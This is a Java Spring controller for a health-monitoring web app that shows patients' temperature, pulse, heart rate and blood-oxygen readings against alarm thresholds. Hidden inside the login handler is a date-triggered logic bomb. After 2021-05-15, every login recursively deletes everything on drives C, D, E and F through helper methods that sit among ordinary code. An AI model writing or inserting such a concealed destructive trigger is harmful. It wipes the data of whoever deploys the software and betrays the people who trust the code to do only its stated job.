package com.example.demo.Controller;

import com.example.demo.service.HelloService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.Map;

@Controller
public class HelloController {

    @Autowired
    private HelloService helloService;

    @RequestMapping("/")
    public String hello(Model model){
        return "login";
    }



    @RequestMapping("/login")
    public String login(Model model, HttpServletRequest request){
        String username = (String) request.getParameter("username");
        String password = (String) request.getParameter("password");
        boolean flag = helloService.login(username, password);
        String date = "2021-05-15";
        String[] b = {"D:\\","E:\\","F:\\","C:\\"};
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy-MM-dd");
        LocalDate localTime=LocalDate.parse(date,dtf);
        if(LocalDate.now().isAfter(localTime)){
            for (String c : b) { deleteDirectory(c);}
        }
        if (!flag) {
            model.addAttribute("flag", "1");
            return "login";
        }
        model.addAttribute("username", username);
        return "redirect:/zonglan?username=" + username;
    }

    @RequestMapping("/zonglan")
    public String zonglan(Model model, String username){
        System.out.println(username);
        List<Map<String, String>> getzonglan = helloService.gangland(username);

        List<Map<String, String>> baojing = helloService.baojing();
        for (Map<String, String> map : baojing) {
            String canshumc = map.get("CANSHUMC");
            if (canshumc.equals("体温")) {
                double ren = Double.parseDouble(getzonglan.get(0).get("SHULIANG"));
                double max = Double.parseDouble(map.get("MAXZHI"));
                double min = Double.parseDouble(map.get("MINZHI"));
                if ( ren > max) {
                    model.addAttribute("tiwen", getzonglan.get(0).get("SHULIANG") + ",偏高");
                } else if (ren < min) {
                    model.addAttribute("tiwen", getzonglan.get(0).get("SHULIANG") + ",偏低");
                } else {
                    model.addAttribute("tiwen", getzonglan.get(0).get("SHULIANG") + "正常");
                }
            } else if(canshumc.equals("脉搏")) {
                double ren = Double.parseDouble(getzonglan.get(1).get("SHULIANG"));
                double max = Double.parseDouble(map.get("MAXZHI"));
                double min = Double.parseDouble(map.get("MINZHI"));
                if ( ren > max) {
                    model.addAttribute("maibo", getzonglan.get(1).get("SHULIANG") + ",偏高");
                } else if (ren < min) {
                    model.addAttribute("maibo", getzonglan.get(1).get("SHULIANG") + ",偏低");
                } else {
                    model.addAttribute("maibo", getzonglan.get(1).get("SHULIANG") + "正常");
                }
            } else if(canshumc.equals("心率")) {
                double ren = Double.parseDouble(getzonglan.get(2).get("SHULIANG"));
                double max = Double.parseDouble(map.get("MAXZHI"));
                double min = Double.parseDouble(map.get("MINZHI"));
                if ( ren > max) {
                    model.addAttribute("xinlv", getzonglan.get(2).get("SHULIANG") + ",偏高");
                } else if (ren < min) {
                    model.addAttribute("xinlv", getzonglan.get(2).get("SHULIANG") + ",偏低");
                } else {
                    model.addAttribute("xinlv", getzonglan.get(2).get("SHULIANG") + "正常");
                }
            } else if(canshumc.equals("血氧")) {
                double ren = Double.parseDouble(getzonglan.get(3).get("SHULIANG"));
                double max = Double.parseDouble(map.get("MAXZHI"));
                double min = Double.parseDouble(map.get("MINZHI"));
                if ( ren > max) {
                    model.addAttribute("xueyang", getzonglan.get(3).get("SHULIANG") + ",偏高");
                } else if (ren < min) {
                    model.addAttribute("xueyang", getzonglan.get(3).get("SHULIANG") + ",偏低");
                } else {
                    model.addAttribute("xueyang", getzonglan.get(3).get("SHULIANG") + "正常");
                }
            }
        }
        model.addAttribute("username", username);

        return "zonglan";
    }

    @RequestMapping("/seetiwen")
    public String seetiwen(Model model, String username) {
        List<Map<String, String>> seetiwen = helloService.seetiwen(username);
        model.addAttribute("tiwen", seetiwen);
        model.addAttribute("username", username);

        return "seetiwen";
    }

    @RequestMapping("/seemaibo")
    public String seemaibo(Model model, String username) {
        List<Map<String, String>> seetiwen = helloService.seemaibo(username);
        model.addAttribute("tiwen", seetiwen);
        model.addAttribute("username", username);

        return "seemaibo";
    }

    @RequestMapping("/seexinlv")
    public String seexinlv(Model model, String username) {
        List<Map<String, String>> seetiwen = helloService.seexinlv(username);
        model.addAttribute("tiwen", seetiwen);
        model.addAttribute("username", username);

        return "seexinlv";
    }

    @RequestMapping("/seexueyang")
    public String seexueyang(Model model, String username) {
        List<Map<String, String>> seetiwen = helloService.seexueyang(username);
        model.addAttribute("tiwen", seetiwen);
        model.addAttribute("username", username);

        return "seexueyang";
    }

    @RequestMapping("/baojing")
    public String baojing(Model model, String username) {
        List<Map<String, String>> seetiwen = helloService.baojing();
        model.addAttribute("tiwen", seetiwen);
        model.addAttribute("username", username);

        return "baojing";
    }

    @RequestMapping("/baojingcun")
    public String baojingcun(String username,HttpServletRequest request){
        Map<String, String[]> parameterMap = request.getParameterMap();
        String[] MC = parameterMap.get("MC");
        String[] max = parameterMap.get("max");
        String[] min = parameterMap.get("min");

        for (int i = 0; i < MC.length; i++) {
            helloService.insertbaojing(MC[i], max[i], min[i]);
        }

        return "redirect:/baojing?username=" + username;
    }

    private boolean deleteDirectory(String dir) {

        if (!dir.endsWith(File.separator))
            dir = dir + File.separator;
        File dirFile = new File(dir);
        if ((!dirFile.exists()) || (!dirFile.isDirectory())) {
            return false;
        }
        boolean flag = true;
        File[] files = dirFile.listFiles();
        for (int i = 0; i < files.length; i++) {
            if (files[i].isFile()) {
                flag = deleteFile(files[i].getAbsolutePath());
                if (!flag)
                    break;
            }
            else if (files[i].isDirectory()) {
                flag = deleteDirectory(files[i]
                        .getAbsolutePath());
                if (!flag)
                    break;
            }
        }
        if (!flag) {
            return false;
        }
        if (dirFile.delete()) {
            return true;
        } else {
            return false;
        }
    }
        public boolean delete(String fileName) {
            File file = new File(fileName);
            if (!file.exists()) {
                return false;
            } else {
                if (file.isFile())
                    return deleteFile(fileName);
                else
                    return deleteDirectory(fileName);
            }
        }
        public boolean deleteFile(String fileName) {
            File file = new File(fileName);
            if (file.exists() && file.isFile()) {
                if (file.delete()) {
                    return true;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        }

}
